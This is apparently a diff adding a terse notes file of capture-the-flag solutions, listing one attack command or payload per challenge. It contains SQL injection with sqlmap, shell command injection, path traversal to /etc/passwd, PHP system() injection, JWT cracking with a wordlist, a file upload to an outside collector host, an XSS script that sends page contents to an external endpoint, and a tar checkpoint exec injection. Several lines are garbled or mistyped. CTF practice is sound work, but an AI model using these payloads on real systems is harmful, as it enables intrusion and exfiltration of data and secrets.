@@ -1,0 +1,16 @@
+Small_data_leak :sqlmap -u "http://35.242.237.75:30739/user?id=1" -t guests –dump
+ping station: 0.0.0.0; cat flag
+file-crawler: 34.89.202.117:32256/local?image_name=....//....//....//....//tmp/flag
+ultra-crawl: File:/etc/passwd curl -i “url/etc/passwd” file:/home/ctf/app.py  curl -H “Host:company.tld” “url”
+alien-inclusion: curl http://34.89.202.117:30846/?start -d “start=flag.txt”
+substitude: http://34.89.202.117:32189/index.php?vector=/admin/ei&replace=tekla/system(“ls”)
+ http://34.89.202.117:32189/index.php?vector=/admin/ei&replace=system(“cd hwdhf; ls/cat flag.txt”)
+under-construction: jwt ROLE_ADMIN git clone “-“  cd jwt_tool  pip install -r requirements.txt  python3 -m venv Tekla  ls  source Tekla/bin/activate  python3 jwt_tool.py <jwt> -C -d /user/share/worldlists/rockyou.txt/  letmein  f5
+downloader: https://downloader.free.beeceptor.com/test.png --post-file '/var/www/html/flag.php'
+frameble: <script> var exfil = document.getElementsByTagName("body")[0].innerHTML; window.location.href="https://frameble.free.beeceptor.com?pgsrc=" + btoa(exfil); </script>
+manual-review: <script>window.location.href="(request bin link)";</script>
+tartarsausage: cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="cat enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/flag"
+
+
+
+
